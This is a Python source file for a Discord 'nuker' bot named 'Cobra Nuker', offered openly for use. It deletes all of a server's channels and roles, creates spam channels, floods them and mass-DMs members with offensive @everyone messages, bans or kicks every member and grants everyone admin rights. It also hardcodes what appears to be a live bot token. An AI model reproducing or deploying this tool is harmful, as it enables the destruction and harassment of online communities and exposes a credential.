# Credits: https://discord.gg/programs - Do not claim it as your own program

import discord, asyncio, colorama, json, random, os, ctypes, webbrowser
from pystyle import Colorate, Colors, Write
from discord.ext import commands
from discord import Permissions
from discord import Webhook, AsyncWebhookAdapter

ctypes.windll.kernel32.SetConsoleTitleW("Created by Conetic | Discord: Conetic#4443 | https://discord.gg/programs") 
#webbrowser.open('https://discord.gg/programs')

client = commands.Bot(command_prefix="!", intents = discord.Intents.all()) # change the bot prefix
client.remove_command('help')

token = 'OTY4MDIwOTkxMDA1NTY0OTM4.YmYxzQ.ycH9y3RxngXgN4OsG3jsLO_XoJk' #token
channel_names = ['Conetic', 'Get FUCKED', 'PC Programs']
message_spam = ['@everyone Fucked By Conetic https://discord.gg/programs', '@everyone Fucked By PC Programs https://discord.gg/programs']
webhook_names = ['PC Programs', 'Conetic']

@client.event
async def on_ready():
  await client.change_presence(activity=discord.Game(name= "discord.gg/programs" ))
  print("", Colors.red)
  print(f""" 

    ██████╗ ██████╗ ██████╗ ██████╗  █████╗     ███╗   ██╗██╗   ██╗██╗  ██╗███████╗██████╗ 
   ██╔════╝██╔═══██╗██╔══██╗██╔══██╗██╔══██╗    ████╗  ██║██║   ██║██║ ██╔╝██╔════╝██╔══██╗
   ██║     ██║   ██║██████╔╝██████╔╝███████║    ██╔██╗ ██║██║   ██║█████╔╝ █████╗  ██████╔╝
   ██║     ██║   ██║██╔══██╗██╔══██╗██╔══██║    ██║╚██╗██║██║   ██║██╔═██╗ ██╔══╝  ██╔══██╗
   ╚██████╗╚██████╔╝██████╔╝██║  ██║██║  ██║    ██║ ╚████║╚██████╔╝██║  ██╗███████╗██║  ██║
    ╚═════╝ ╚═════╝ ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝    ╚═╝  ╚═══╝ ╚═════╝ ╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝

                                    Discord User: {client.user}
                               Type "!help" in discord for commands
                          Close the window to stop all actions happening
""", Colors.red)

@client.command()
async def nuke(ctx, amount=50):
  await ctx.message.delete()
  await ctx.guild.edit(name="discord.gg/programs")
  channels = ctx.guild.channels
  for channel in channels:
    try:
      await channel.delete()
      print(f" You have deleted {channel.name}", Colors.red)
    except:
        pass
        print (f" You were unable to delete {channel.name}", Colors.red)
        guild = ctx.message.guild
  for i in range(amount):
    try:  
      await ctx.guild.create_text_channel(random.choice(channel_names))
      print(f"You have created a channel [{i}]", Colors.red)
    except:
      print("You were unable to create a channel", Colors.red)
  for role in ctx.guild.roles:
    try:
      await role.delete()
      print(f" You have deleted {role.name}", Colors.red)

    except:
      print(f" You were unable to delete {role.name}", Colors.red)
  await asyncio.sleep(2)
  for i in range(100):  
    for i in range(1000):
      for channel in ctx.guild.channels:
        try:
          await channel.send(random.choice(message_spam)
        )
          print(f"You have pinged {channel.name}", Colors.red)
        except:
          print(f"You were unable to ping {channel.name}!", Colors.red)
    for member in ctx.guild.members:
      if member.id != 847570148198318120:  
        try:
          await member.ban(reason= "NUKED") #change this if u want
          print(f"You have benned {member.name}", Colors.red)
        except:
          print(f"You were unable to ban {member.name}", Colors.red)
          

@client.event
async def on_guild_channel_create(channel):
  while True:
    await channel.send(random.choice(message_spam))


@client.event
async def on_guild_channel_create(channel):
  webhook =await channel.create_webhook(name = random.choice(webhook_names))  
  while True:  
    await channel.send(random.choice(message_spam))
    await webhook.send(random.choice(message_spam), username=random.choice(webhook_names))



@client.command()
async def banall(ctx):
  await ctx.message.delete()
  for member in ctx.guild.members:
    if member.id != 1:
     for user in list(ctx.guild.members):
       try:
         await ctx.guild.ban(user)
         print (f" You have banned {member.name}")
       except:
         print(f" You were unable to ban {member.name}")
  


@client.command()
async def kickall(ctx):
  await ctx.message.delete()
  for member in ctx.guild.members:
    try:
      await member.kick(reason="NUKED")
      print(f" You have kicked {member.name}", Colors.red)
    except:
      print(f" You were unable to kick {member.name}", Colors.red)


@client.command()
async def rolespam(ctx):
  await ctx.message.delete()
  for i in range(1, 250):
    try:
      await ctx.guild.create_role(name=f"NUKED")
      print(f" You created a new role in {ctx.guild.name}", Colors.red)
    except:
      print(f" You were unable to created a new role in {ctx.guild.name}", Colors.red)


@client.command()
async def dm(ctx, *, message:str):
  await ctx.message.delete()
  for user in list(ctx.guild.members):
    try:
      await user.send(message)
      print(f" You have messaged everyone", Colors.red)
    except:
      print(f" You were unable to message everyone", Colors.red)


@client.command(pass_context=True)
async def admin(ctx):
  await ctx.message.delete()
  for role in list(ctx.guild.roles):
             if role.name == '@everyone':
                  try:
                      await role.edit(permissions=Permissions.all())
                      print(f" You granted everyone Admin", Colors.red) 
                  except:
                      print(f" You were unable to grant everyone Admin", Colors.red)


@client.command()
async def help(ctx, *args):
    await ctx.message.delete()
    retStr = str("""```fix\n!nuke - Destroys Server\n\n!banall - Bans All Members \n\n!kickall - Kicks All Members\n\n!rolespam - Spam Create Roles\n\n!dm (message) - Dms Everyone In Server\n\n!admin - Gives Everyone Admin Permissions```""")
    NUKE = discord.Embed(color=14177041,title="Cobra Nuker")
    NUKE.add_field(name="Listed Commands Below",value=retStr)
    NUKE.set_footer(text=f"Requested By {ctx.author} | https://discord.gg/programs")

    await ctx.send(embed=NUKE)


client.run(token)